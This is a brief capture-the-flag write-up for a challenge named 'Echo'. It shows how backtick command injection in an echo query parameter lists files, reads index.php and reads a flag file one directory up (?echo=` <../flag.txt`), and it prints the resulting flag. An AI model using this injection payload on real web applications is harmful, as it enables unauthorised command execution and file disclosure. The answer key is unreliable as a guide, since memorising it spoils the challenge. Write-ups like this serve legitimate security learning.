Echo

command injection use \` to evaluate a command. 
`use \`ls\`` to list the files in the current directory. 
cat the index.php to take a look at the checks.
Find where the flag lives

It's one directory behind
so use the already defined echo and pass the flag as input to echo to view it.
?echo=` <../flag.txt` to read the flag

flag{1beadaf44586ea4aba2ea9a00c5b6d91} 
